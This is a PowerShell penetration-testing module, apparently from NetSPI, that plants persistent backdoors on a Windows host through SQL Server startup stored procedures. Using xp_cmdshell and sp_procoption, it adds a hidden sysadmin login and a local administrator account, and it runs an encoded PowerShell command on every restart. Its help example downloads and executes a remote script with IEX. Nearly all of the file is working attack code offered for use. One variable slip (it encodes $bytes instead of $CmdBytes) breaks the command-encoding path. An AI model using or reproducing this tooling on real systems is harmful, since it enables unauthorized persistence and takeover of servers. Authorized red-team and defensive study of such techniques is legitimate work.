function Invoke-SqlServer-Persist-AutrunSp
{
    <#
	.SYNOPSIS
	This script can be used backdoor a Windows system using a SQL Server startup stored procedure.
    This is done marking a user defined stored procedure to run when the SQL Server is restarted 
    using the native sp_procoption stored procedure. Note: This script requires sysadmin privileges.

	.DESCRIPTION
	This script can be used backdoor a Windows system using a SQL Server startup stored procedure.
    This is done marking a user defined stored procedure to run when the SQL Server is restarted 
    using the native sp_procoption stored procedure. This script supports the executing operating system 
    and PowerShell commands as the SQL Server service account using the native xp_cmdshell stored procedure. 
    The script also support add a new sysadmin. This script can be run as the current Windows user or a 
    SQL Server login can be provided. Note: This script requires sysadmin privileges.

	.EXAMPLE
	Create startup stored procedure to add a new sysadmin.  The example shows the script being run using a SQL Login.

	PS C:\> Invoke-SqlServer-Persist-AutrunSp -SqlServerInstance "SERVERNAME\INSTANCENAME" -SqlUser MySQLAdmin -SqlPass MyPassword123! -NewSqlUser mysqluser -NewSqlPass NewPassword123! 

	.EXAMPLE
	Create startup stored procedure to add a local administrator to the Windows OS via xp_cmdshell.  The example shows the script 
	being run as the current windows user.

	PS C:\> Invoke-SqlServer-Persist-AutrunSp -SqlServerInstance "SERVERNAME\INSTANCENAME" -NewOsUser myosuser -NewOsPass NewPassword123!

	.EXAMPLE
	Create startup stored procedure to run a PowerShell command via xp_cmdshell. The example below downloads a PowerShell script and 
	from the internet and executes it.  The example shows the script being run as the current Windows user.

	PS C:\> Invoke-SqlServer-Persist-AutrunSp -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"

	.LINK
	   http://www.netspi.com
	   http://msdn.microsoft.com/en-us/library/ms178640.aspx

	.NOTES
	   Author: Scott Sutherland - 2014, NetSPI
	   Version: Invoke-SqlServer-Backdoor-AutrunSp.psm1 v1.0
	   Comments: 
        - This should work on SQL Server 2005 and Above.
        - The added procedures can be manually viewed using the query below.
            SELECT ROUTINE_NAME, ROUTINE_DEFINITION
            FROM MASTER.INFORMATION_SCHEMA.ROUTINES
            WHERE OBJECTPROPERTY(OBJECT_ID(ROUTINE_NAME),'ExecIsStartup') = 1
        - The procedures can also be removed with tsql below.
            drop proc sp_add_osadmin
            drop proc sp_add_sysadmin
            drop proc sp_add_pscmd   

	.TODO
	   - enable xp_cmdshell
       - add local admin check for local admin add
       - add local admin check for pscmd
        	   
    #>

  [CmdletBinding()]
  Param(
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set SQL Login username.')]
    [string]$SqlUser,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set SQL Login password.')]
    [string]$SqlPass,

    [Parameter(Mandatory=$false,
    HelpMessage='Set username for new SQL Server sysadmin login.')]
    [string]$NewSqlUser,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set password for new SQL Server sysadmin login.')]
    [string]$NewSqlPass,

    [Parameter(Mandatory=$false,
    HelpMessage='Set username for new Windows local administrator account.')]
    [string]$NewOsUser,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set password for new Windows local administrator account.')]
    [string]$NewOsPass,

    [Parameter(Mandatory=$false,
    HelpMessage='Create stored procedure that run the provide PowerShell command.')]
    [string]$PsCommand,

    [Parameter(Mandatory=$true,
    HelpMessage='Set target SQL Server instance.')]
    [string]$SqlServerInstance
    
  )

    # -----------------------------------------------
    # Setup database connection string
    # -----------------------------------------------
    
    # Create fun connection object
    $conn = New-Object System.Data.SqlClient.SqlConnection
    
    # Set authentication type and create connection string
    if($SqlUser){
    
        # SQL login / alternative domain credentials
         Write-Output "[*] Attempting to authenticate to $SqlServerInstance with SQL login $SqlUser..."
        $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;"
        [string]$ConnectUser = $SqlUser
    }else{
            
        # Trusted connection
        Write-Output "[*] Attempting to authenticate to $SqlServerInstance as the current Windows user..."
        $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;"   
        $UserDomain = [Environment]::UserDomainName
        $Username = [Environment]::UserName
        $ConnectUser = "$UserDomain\$Username"                    
     }


    # -----------------------------------------------
    # Test database connection
    # -----------------------------------------------
    try{
        $conn.Open()
        Write-Host "[*] Connected." -foreground "green"
        $conn.Close()
    }catch{
        $ErrorMessage = $_.Exception.Message
        Write-Host "[*] Connection failed" -foreground "red"
        Write-Host "[*] Error: $ErrorMessage" -foreground "red"  
        Break
    }


    # -----------------------------------------------
    # Check if the user is a sysadmin
    # -----------------------------------------------

    # Open db connection
    $conn.Open()

    # Setup query
    $Query = "select is_srvrolemember('sysadmin') as sysstatus"

    # Execute query
    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
    $results = $cmd.ExecuteReader() 

    # Parse query results
    $TableIsSysAdmin = New-Object System.Data.DataTable
    $TableIsSysAdmin.Load($results)  

    # Check if current user is a sysadmin
    $TableIsSysAdmin | Select-Object -First 1 sysstatus | foreach {

        $Checksysadmin = $_.sysstatus
        if ($Checksysadmin -ne 0){
            Write-Host "[*] Confirmed Sysadmin access." -foreground "green"                             
        }else{
            Write-Host "[*] The current user does not have sysadmin privileges." -foreground "red"
            Write-Host "[*] Sysadmin privileges are required." -foreground "red"
            Break
        }
    }

    # Close db connection
    $conn.Close()

   
    # -------------------------------------------------------
    # Create startup stored procedure to run PowerShell code
    # -------------------------------------------------------    
       
     if($PsCommand){

        # Status user
        Write-Host "[*] Creating a stored procedure to run PowerShell code..." -foreground "green" 
        
        # ---------------------------
        # Create procedure
        # ---------------------------

        # This encoding method was based on a function by Carlos Perez 
        # https://raw.githubusercontent.com/darkoperator/Posh-SecMod/master/PostExploitation/PostExploitation.psm1

        # Encode PowerShell command
        $CmdBytes = [Text.Encoding]::Unicode.GetBytes($PsCommand)
        $EncodedCommand = [Convert]::ToBase64String($bytes)

        # Check if PowerShell command is too long
        If ($EncodedCommand.Length -gt 8100)
        {
            Write-Host "Encoded is too long." -foreground "red"           
        }else{
            
            # Open db connection
            $conn.Open()

            # Setup query - create procedure
            $Query = "IF NOT EXISTS (SELECT * FROM sys.objects WHERE type = 'P' AND OBJECT_ID = OBJECT_ID('dbo.sp_add_pscmd'))
            exec('CREATE PROCEDURE sp_add_pscmd
            AS
            EXEC master..xp_cmdshell ''PowerShell -enc $EncodedCommand''');"

            # Execute query - create procedure
            $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
            $results = $cmd.ExecuteReader() 
        
            # Close db connection
            $conn.Close()       
 
            # ---------------------------
            # Mark procedure for startup
            # ---------------------------
        
            # Open db connection
            $conn.Open()

            # Setup query - mark procedure for startup
            $Query = "EXEC sp_procoption @ProcName = 'sp_add_pscmd',
            @OptionName = 'startup',
            @OptionValue = 'on';"

            # Execute query - mark procedure for startup
            $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
            $results = $cmd.ExecuteReader() 

            # Close db connection
            $conn.Close()  
        
            Write-Host "[*] Startup stored procedure sp_add_pscmd added to run provided PowerShell command." -foreground "green"      
        }
    }else{
        Write-Host "[*] sp_add_pscmd will not be created because pscommand was not provided." 
    }   


    # -------------------------------------------------------
    # Create startup stored procedure to add OS Administrator
    # -------------------------------------------------------      
    
     if($NewOsUser){

        # Status user
        Write-Host "[*] Creating a stored procedure to create a os administrator..." -foreground "green" 
        
        # ---------------------------
        # Create procedure
        # ---------------------------

        # Open db connection
        $conn.Open()

        # Setup query - create procedure
        $Query = "IF NOT EXISTS (SELECT * FROM sys.objects WHERE type = 'P' AND OBJECT_ID = OBJECT_ID('dbo.sp_add_osadmin'))
        exec('CREATE PROCEDURE sp_add_osadmin 
        AS
        EXEC master..xp_cmdshell ''net user $NewOsUser $NewOsPass /add & net localgroup administrators /add $NewOsUser''');"

        # Execute query - create procedure
        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
        $results = $cmd.ExecuteReader() 
        
        # Close db connection
        $conn.Close()       
 
        # ---------------------------
        # Mark procedure for startup
        # ---------------------------
        
        # Open db connection
        $conn.Open()

        # Setup query - mark procedure for startup
        $Query = "EXEC sp_procoption @ProcName = 'sp_add_osadmin',
        @OptionName = 'startup',
        @OptionValue = 'on';"

        # Execute query - mark procedure for startup
        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
        $results = $cmd.ExecuteReader() 

        # Close db connection
        $conn.Close()  
        
         Write-Host "[*] Startup stored procedure sp_add_osadmin was created to add os admin $NewOsUser with password $NewOSPass." -foreground "green"      
    }else{
        Write-Host "[*] sp_add_osadmin will not be created because NewOsUser and NewOsPass were not provided." 
    } 

    # -------------------------------------------------------
    # Create startup stored procedure to add a sysadmin
    # -------------------------------------------------------
    
    if($NewSqlUser){

        # Status user
        Write-Host "[*] Creating stored procedure sp_add_sysadmin..." -foreground "green" 

        # ---------------------------
        # Create procedure
        # ---------------------------

        # Open db connection
        $conn.Open()

        # Setup query - create procedure
        $Query = "IF NOT EXISTS (SELECT * FROM sys.objects WHERE type = 'P' AND OBJECT_ID = OBJECT_ID('dbo.sp_add_sysadmin'))
        exec('CREATE PROCEDURE sp_add_sysadmin
        AS
        CREATE LOGIN $NewSqlUser WITH PASSWORD = ''$NewSqlPass'';
        EXEC sp_addsrvrolemember ''$NewSqlUser'', ''sysadmin'';')"

        # Execute query - create procedure
        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
        $results = $cmd.ExecuteReader() 
        
        # Close db connection
        $conn.Close()       
                         
        # ---------------------------
        # Mark procedure for startup
        # ---------------------------

        # Open db connection
        $conn.Open()

        # Setup query - mark procedure for startup
        $Query = "EXEC sp_procoption @ProcName = 'sp_add_sysadmin',
        @OptionName = 'startup',
        @OptionValue = 'on';"

        # Execute query - mark procedure for startup
        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
        $results = $cmd.ExecuteReader() 

        # Close db connection
        $conn.Close()  
        
         Write-Host "[*] Startup stored procedure sp_add_sysadmin was created to add sysadmin $NewSqlUser with password $NewSqlPass." -foreground "green"      
    }else{
        Write-Host "[*] sp_add_sysadmin will not be created because NewSqlUser and NewSqlPass were not provided." 
    }
    Write-Host "[*] All done."        
}
